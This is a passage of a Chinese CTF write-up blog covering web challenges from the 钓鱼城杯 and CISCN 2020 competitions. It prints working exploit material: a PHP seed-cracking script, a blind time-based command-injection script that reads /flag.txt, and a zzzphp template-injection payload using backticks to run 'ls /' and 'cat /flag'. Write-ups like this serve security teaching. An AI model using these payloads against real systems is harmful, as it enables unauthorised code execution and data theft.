&#39;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#39;);</span><br><span class="line"></span><br><span class="line">function random($length, $chars &#x3D; &#39;0123456789ABC&#39;) &#123;</span><br><span class="line">    $hash &#x3D; &#39;&#39;;</span><br><span class="line">    $max &#x3D; strlen($chars) - 1;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .&#x3D; $chars[mt_rand(0, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很熟悉，题目本身也说了是seed，先转换一下，公钥在cookie种可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"vEUHaY"</span>; <span class="comment">//公钥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#<span class="number">21</span> <span class="number">21</span> <span class="number">0</span> <span class="number">51</span> <span class="number">30</span> <span class="number">30</span> <span class="number">0</span> <span class="number">51</span> <span class="number">46</span> <span class="number">46</span> <span class="number">0</span> <span class="number">51</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">51</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">51</span> <span class="number">50</span> <span class="number">50</span> <span class="number">0</span> <span class="number">51</span></span><br></pre></td></tr></table></figure><p>再用<code>php_mt_seed</code>解一下得到种子</p><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/1.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">718225</span>);</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line"><span class="keyword">echo</span> $key;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $lock;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</span><br><span class="line">$hash = <span class="string">''</span>;</span><br><span class="line">$max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">$hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重新生成key值，再去替换，但是一直没有用，原因就在开始的提示，要用xff</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://122.112.252.28:20001/'</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'key'</span>:<span class="string">'nRtqGR8mtd9ZOPyI'</span>,</span><br><span class="line">    <span class="string">'lock'</span>:<span class="string">'vEUHaY'</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">'127.0.0.1'</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.post(url=url,headers=headers,cookies=cookies)</span><br><span class="line">print(req.text)</span><br></pre></td></tr></table></figure><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/2.png" class=""><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a><strong>easyweb</strong></h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>无回显命令注入</li><li>盲注</li><li>linux常用命令——cut</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题什么都没有就一句话，老套路了，抓个包看一下</p><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/3.png" class=""><p>经过测试命令注入无回显，不知道反弹shell行不行，没有试，队里师傅用的盲注，就用盲注好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment"># url = 'http://122.112.252.28:20001/'</span></span><br><span class="line"><span class="comment"># cookies = &#123;</span></span><br><span class="line"><span class="comment">#     'key':'nRtqGR8mtd9ZOPyI',</span></span><br><span class="line"><span class="comment">#     'lock':'vEUHaY'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># headers = &#123;</span></span><br><span class="line"><span class="comment">#     'X-Forwarded-For':'127.0.0.1'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># req = requests.post(url=url,headers=headers,cookies=cookies)</span></span><br><span class="line"><span class="comment"># print(req.text)</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://119.3.37.185/'</span></span><br><span class="line">payload = <span class="string">'if [ `cut -c  &#123;num1&#125; /flag.txt` = "&#123;num2&#125;" ];then sleep 2;fi'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'cmd'</span>:payload.format(num1=str(i),num2=chr(j))</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time()</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time()-start_time&gt;<span class="number">2</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> chr(j) == <span class="string">'&#125;'</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/4.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> dycb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN全国大学生信息安全竞赛初赛</title>
      <link href="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
      <url>/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h2><p>这次比赛赛后感慨颇多，突然发现也有成长，不像之前一样没输出了，当时没做出的一道WEB复现发现真的很简单，还是平时一些简单的点没有太过重视，也是一次警醒，下面来看看题</p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>call_user_func_array函数</li><li>php异常退出</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开容器，直接给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>审计代码，会发现能利用的点就是<code>call_user_func_array</code>函数，会发现这里有四个两个参数，第二个参数是一个数组，google一下可以找到一个整理了php的bug的网站，找到了一篇文章<a href="https://bugs.php.net/bug.php?id=79982，文章里提到了一种异常退出的方法" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79982，文章里提到了一种异常退出的方法</a></p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/1.png" class=""><p>刚好这道题要让程序异常退出，就会进入到phpinfo()</p><p>根据文章里的poc，我们利用<code>stream_socket_client</code>函数来触发报错，得到<code>phpinfo()</code></p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/2.png" class=""><p>开始拿到这个页面不知道有什么用，看来一下<code>disable_function</code>,都可以用，加上这题很快被打穿，应该没那么难，搜索一下<code>flag{</code>,直接找到了</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/3.png" class=""><h2 id="RCEME"><a href="#RCEME" class="headerlink" title="RCEME"></a>RCEME</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>命令执行</li><li>反引号</li><li>php输出方法</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">"*"</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符【'</span>.$val.<span class="string">'】'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^[a-z]$/i"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">( $content )</span> </span>&#123;</span><br><span class="line">    $pattern = <span class="string">'/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/'</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">''</span>;</span><br><span class="line">            $out_html = <span class="string">''</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">'='</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">'='</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">''</span> || $arr[<span class="number">1</span>]==<span class="string">''</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正【'</span>.$ifstr.<span class="string">'】'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">'='</span>, <span class="string">'=='</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">'&lt;&gt;'</span>, <span class="string">'!='</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'or'</span>, <span class="string">'||'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'and'</span>, <span class="string">'&amp;&amp;'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'mod'</span>, <span class="string">'%'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'not'</span>, <span class="string">'!'</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/\&#123;|&#125;/'</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正'</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">'if('</span> . $ifstr . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/'</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'if'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'else'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">'if'</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">'/\&#123;if([0-9]):/'</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;if'</span> . $matches3[ <span class="number">1</span> ], <span class="string">'&#123;if'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;else'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;else&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;end if'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;end if&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span><span class="params">( $s, $str=<span class="string">','</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">''</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了很多命令执行函数</p><p>由于不了解parserIfLabel的用法，在google的时候找到了一样的源码和poc，是一个cve的部分内容</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/4.png" class=""><p>这个GitHub地址给了poc但是打不通，稍微和原题有区别<a href="https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md" target="_blank" rel="noopener">https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md</a></p><p>后来又找到了另一篇blog，本质无区别<a href="https://blog.csdn.net/CSDNPM250/article/details/104211233" target="_blank" rel="noopener">https://blog.csdn.net/CSDNPM250/article/details/104211233</a></p><p>总的来说拿到手的poc形式就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(phpinfo());&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure><p>这里在本次测试可以发现php是被过滤了的，大小写双写都是无法绕过的</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/5.png" class=""><p>这里就要想想还有什么方法能够拿到回显，突然想到我可以避开phpinfo拿回显啊，这几篇blog产生了误导，死活要拿phpinfo的回显</p><p>直接用echo 打印目录好像也可以，再加上反引号没有被过滤，反引号的作用相当于命令执行函数，命令执行函数在白盒中被ban完了，但是反引号更好用，反引号相当于命令执行函数并且能把执行结果返回</p><p>由于容器关了就给poc吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(&#96;ls &#x2F;&#96;);&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure><p>在根目录下面会发现flag文件，用cat读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？a&#x3D;&#123;if:1)echo(&#96;cat &#x2F;flag&#96;);&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/6.png" class=""><h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>nodejs原生链污染</li><li><code>set-value</code>的原型链污染漏洞</li></ul><h3 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>题目给了附件，解压拖到subline里,看了老半天发现只用看下面这两个文件就可以了</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/7.png" class=""><p>nodejs基本不太会，先找了篇文章看看原型链污染的原理，简单来说就是要利用到<code>__proto__</code>属性，下面是文章里比较重要的部分</p><p>继承的查找过程:</p><p>  调用对象属性时, 会查找属性，如果本身没有，则会去<code>__proto__</code>中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有<code>__proto__</code>，那么会去<code>__proto__</code>的显式原型中查找，一直到null</p><p>到这里原理差不多了，下面就是分析了</p><p>在看到<code>const setFn = require(&#39;set-value&#39;);</code>不是很理解，google的时候找到了一篇文章</p><p><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" 